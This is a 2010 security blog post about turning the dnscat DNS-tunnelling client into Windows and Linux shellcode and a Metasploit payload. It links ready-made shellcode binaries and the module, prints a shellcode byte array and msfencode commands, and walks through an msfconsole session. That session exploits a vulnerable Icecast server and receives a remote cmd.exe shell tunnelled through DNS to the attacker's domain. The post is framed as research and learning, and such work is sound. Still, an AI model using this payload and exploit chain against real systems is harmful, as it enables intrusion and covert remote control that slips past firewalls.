---
id: 623
title: 'Weaponizing dnscat with shellcode and Metasploit'
date: '2010-03-17T20:54:17-05:00'
author: 'Ron Bowes'
layout: revision
guid: 'http://www.skullsecurity.org/blog/?p=623'
permalink: '/?p=623'
---

Hey all,

I've been letting other projects slip these last couple weeks because I was excited about converting dnscat into shellcode (or "weaponizing dnscat", as I enjoy saying). Even though I got into the security field with reverse engineering and writing hacks for games, I have never written more than a couple lines of x86 at a time, nor have I ever written shellcode, so this was an awesome learning experience. Most people start by writing shellcode that spawns a local shell; I decided to start with shellcode that implements a dnscat client in under 1024 bytes (for both Linux and Windows). Like I always say, go big or go home!  
  
If you just want to grab the files, here are some links:

- [Win32 shellcode - assembler](/blogdata/dnscat-shell-win32.asm)
- [Win32 shellcode - binary](/blogdata/dnscat-shell-win32)
- [Win32 shellcode - C array](/blogdata/dnscat-shell-win32.h)
- [Win32 Metasploit module](/blogdata/dnscat-shell-win32.rb)
- [Linux shellcode - assembler](/blogdata/dnscat-shell-linux.asm)
- [Linux shellcode - binary](/blogdata/dnscat-shell-linux)
- [Linux shellcode - C array](/blogdata/dnscat-shell-linux.h)

If you want to get your hands dirty, you can compile the source -- right now, it's only in svn:

```
svn co http://svn.skullsecurity.org:81/ron/security/nbtool
cd nbtool
make
```

That'll compile both the standard dnscat client/server and, if you have nasm installed, the Linux and Windows shellcodes. On Windows, you'll need nasm to assemble it. I installed Cygwin, but you can compile the Windows shellcode on Linux or vice versa if you prefer. The output will be in samples/shellcode-\*/. A .h file containing the C version will be generated, as well:

```
$ head -n3 dnscat-shell-test.h
char shellcode[] =
        "\xe9\xa2\x01\x00\x00\x5d\x81\xec\x00\x04\x00\x00\xe8\x4e\x03\x00"
        "\x00\x31\xdb\x80\xc3\x09\x89\xef\xe8\x2e\x03\x00\x00\x80\xc3\x06"
...
```

And, of course, the raw file is output (without an extension), that can be run through msfencode or embedded into a script:

```
 $ make
[...]
$ wc -c samples/shellcode-win32/dnscat-shell-win32
997 samples/shellcode-win32/dnscat-shell-win32
$ wc -c samples/shellcode-linux/dnscat-shell-linux
988 samples/shellcode-linux/dnscat-shell-linux
```

Unless you want to be sending your cmd.exe (or sh) shell to skullseclabs.org, you'll have to modify the domain as well -- the very last line in the assembly code for both Windows and Linux is this:

```
get_domain:
 call get_domain_top
 db 1, 'a' ; random
 db 12,'skullseclabs' ; 
<p>The two lines with the domain have to be changed. The number preceding the name is, as the comment says, the length of the section ('skullseclabs' is 12 bytes, and 'org' is 3 bytes). This process is automated with the Metasploit payload, as you'll see. </p>
<h2>Encoding with msfencode</h2>
<p>msfencode from the Metasploit project is a beautiful utility. I highly recommend running shellcode through it before using it. The most useful aspect with shellcode is, at least to me, the ability to eliminate characters. So, if I need to get rid of \x00 (null) characters from my strings, it's as easy as:</p>
$ msfencode -b "\x00"  dnscat-shell-win32-encoded
[*] x86/shikata_ga_nai succeeded with size 1024 (iteration=1)

<p>If you're planning on using this in, for example, Metasploit, you don't have to worry about the msfencode step -- it'll do that for you. </p>
<h2>Metasploit payload</h2>
<p>Speaking of metasploit, yes! I wrote a metasploit payload for dnscat. </p>
<p>First, there are a number of caveats:</p>
```

- This is highly experimental
- This doesn't have a proper "exitfunc" call -- it just returns and probably crashes the process
- This is set up as a single stage, right now, and is 1000 or so bytes -- as a result, it won't work against most vulnerabilities
- The dnscat server isn't part of Metasploit, yet, so you'll have to compile run it separately

That being said, it also works great when it's usable. The target I use for testing is [Icecast 2 version 2.0.0](http://downloads.xiph.org/releases/icecast/icecast2_win32_2.0.0_setup.exe) (WARNING: don't install vulnerable software on anything important!), which is included on the SANS 560 and 504 CDs. It's free, GPL, reliable, and has 2000 bytes in which to stuff the payload.

So, the steps you need to take are,

1. Install [Icecast2](http://downloads.xiph.org/releases/icecast/icecast2_win32_2.0.0_setup.exe) on your victim machine (Win32)
2. Download the experimental dnscat [Metasploit module](/blogdata/dnscat-shell-win32.rb) and put it in your Metasploit directory (modules/payloads/singles/windows/)
3. Fire up a dnscat server on your authoritative DNS server (<tt>dnscat --listen</tt>) -- see the [dnscat wiki](/wiki/index.php/Dnscat) for more information
4. Run Metasploit (<tt>msfconsole</tt>) and enter the following commands:
```
msf > use exploit/windows/http/icecast_header

msf exploit(icecast_header) > set PAYLOAD windows/dnscat-shell-win32
PAYLOAD => windows/dnscat-shell-win32

msf exploit(icecast_header) > set RHOST 192.168.1.221
RHOST => 192.168.1.221

msf exploit(icecast_header) > set DOMAIN skullseclabs.org
DOMAIN => skullseclabs.org

msf exploit(icecast_header) > exploit
[*] Exploit completed, but no session was created.
```

Meanwhile, on your dnscat server, if all went well, you should see:

```
$ sudo ./dnscat --listen
Waiting for DNS requests for domain '*' on 0.0.0.0:53...
Switching stream -> datagram
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\Program Files\Icecast2 Win32>
```

You can type commands in, and they'll run just like a normal shell. Be warned, though, that it is somewhat slow, due to the nature of going through DNS.

## Why bother?

The big advantage to this over traditional shellcode is that no port, whether inbound or outbound, is required! As long as the server has a DNS server set that will perform recursive lookups, it'll work great!

## Feedback

As I said, this is the first time I've ever written shellcode or x86. I'm sure there are lots of places where it could be significantly improved, and I'd love to hear feedback from the folks who really know what they're doing and can help me improve my code.

Thanks!